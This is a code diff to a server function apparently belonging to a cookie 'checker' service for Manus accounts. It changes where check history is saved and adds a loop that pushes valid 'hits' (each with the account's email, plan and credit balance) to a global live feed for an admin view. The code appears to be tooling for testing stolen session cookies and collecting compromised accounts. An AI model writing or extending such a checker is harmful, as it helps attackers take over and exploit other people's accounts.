@@ -491,8 +491,8 @@ serve(async (req) => {
 
     // Save to Firebase (non-blocking)
     if (userId) {
-      // Save full history
-      firebasePush(`checkHistory/${userId}`, {
+      // Save full history under user path
+      firebasePush(`users/${userId}/checkHistory`, {
         service: "manus_checker",
         requestId,
         inputCount: cookies.length,
@@ -514,8 +514,9 @@ serve(async (req) => {
         createdAt: new Date().toISOString()
       }).catch(e => console.error(`${getCanaryTimestamp()} [${requestId}] Firebase history save error:`, e));
 
-      // Save HITS separately
+      // Save HITS separately + push to liveHits for real-time admin view
       if (successResults.length > 0) {
+        // Save to user's hits
         firebasePush(`manusHits/${userId}`, {
           requestId,
           hits: successResults.map(r => ({
@@ -531,6 +532,20 @@ serve(async (req) => {
           count: successResults.length,
           checkedAt: new Date().toISOString()
         }).catch(e => console.error(`${getCanaryTimestamp()} [${requestId}] Firebase hits save error:`, e));
+
+        // Push to global liveHits for admin real-time view
+        for (const hit of successResults.slice(0, 10)) { // Limit to 10 per batch
+          firebasePush('liveHits', {
+            service: 'manus_checker',
+            username: username || 'anonymous',
+            hitData: {
+              email: hit.email,
+              plan: hit.plan,
+              totalCredits: hit.totalCredits,
+            },
+            createdAt: Date.now()
+          }).catch(() => {}); // Ignore errors for live hits
+        }
       }
     }
 
